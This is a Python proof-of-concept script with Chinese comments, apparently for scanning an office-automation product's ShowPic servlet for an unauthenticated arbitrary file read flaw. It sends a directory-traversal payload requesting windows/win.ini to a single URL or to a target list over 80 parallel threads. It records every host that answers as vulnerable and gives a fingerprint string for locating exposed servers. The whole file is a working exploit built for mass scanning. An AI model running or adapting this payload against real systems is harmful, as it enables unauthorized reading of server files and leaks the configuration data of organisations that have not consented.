# -*- coding: utf-8 -*-
# 易捷OA协同办公软件 ShowPic 任意文件读取漏洞
# body="/images/logon/bg_img.jpg"
# 产品简介:某捷OA协同办公软件是在“让管理更简单”和“实时协同”的理念的指导下，”本着“简约、实时、快捷、省钱”的产品定位，结合数千家客户的管理实践和当前最先进的IT技术开发出来的全新一代协同产品，在云计算、全文检索、手机应用、企业即时通讯等多方面取得突破性创新。某捷OA简单易学，全程导航，下载即用，在线升级，是国内唯一一款不需要操作手册的OA，是应用和技术的完美结合。
# 漏洞概述:某捷OA协同办公软件 ShowPic 接口处任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
            \x1b[38m██╗   ██╗   ██╗         ██████╗  █████╗ 
            \x1b[36m╚██╗ ██╔╝   ██║        ██╔═══██╗██╔══██╗
            \x1b[34m ╚████╔╝    ██║        ██║   ██║███████║
            \x1b[35m  ╚██╔╝██   ██║        ██║   ██║██╔══██║
            \x1b[31m   ██║ ╚█████╔╝███████╗╚██████╔╝██║  ██║
            \x1b[33m   ╚═╝  ╚════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Version:某捷OA协同办公软件 ShowPic 任意文件读取漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('某捷OA协同办公软件 ShowPic 任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/servlet/ShowPic?filePath=../../windows/win.ini"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and '; for 16-bit app support' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('某捷OA_ShowPic-任意文件读取.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()